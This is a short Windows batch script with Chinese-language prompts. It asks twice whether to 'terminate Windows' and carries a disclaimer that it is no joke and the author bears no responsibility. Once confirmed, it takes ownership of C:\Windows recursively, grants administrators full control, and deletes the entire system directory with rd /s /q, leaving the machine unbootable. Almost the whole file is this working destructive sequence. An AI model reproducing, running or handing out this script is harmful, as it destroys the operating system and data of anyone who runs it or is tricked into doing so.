@echo off
setlocal
:f
choice /c YN /n /m "确定要终结Windows吗？(Y/N)"
if errorlevel 2 (
    exit
)
:s
echo 这不是玩笑程序 确认发生任何后果与原作者无关
choice /c YN /n /m "确定要终结Windows吗？ (Y/N)"
if errorlevel 2 (
    exit
)

echo 开始执行
takeown /F C:\Windows /R /D Y
icacls C:\Windows /grant administrators:F /T
rd /s /q C:\Windows